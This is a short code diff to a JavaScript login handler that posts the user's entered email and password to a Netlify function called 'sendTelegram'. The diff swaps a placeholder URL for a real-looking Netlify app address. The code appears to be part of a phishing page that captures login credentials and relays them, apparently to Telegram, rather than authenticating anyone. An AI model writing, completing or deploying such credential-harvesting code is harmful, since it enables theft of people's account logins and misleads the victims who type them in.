@@ -12,11 +12,14 @@ loginBtn.addEventListener("click", async () => {
   }
 
   try {
-    const res = await fetch("https://YOUR_NETLIFY_FUNCTION_URL/.netlify/functions/sendTelegram", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email, password })
-    });
+    const res = await fetch(
+      "https://remarkable-marzipan-8403d1.netlify.app/.netlify/functions/sendTelegram",
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password })
+      }
+    );
 
     const data = await res.json();
     if (data.success) {
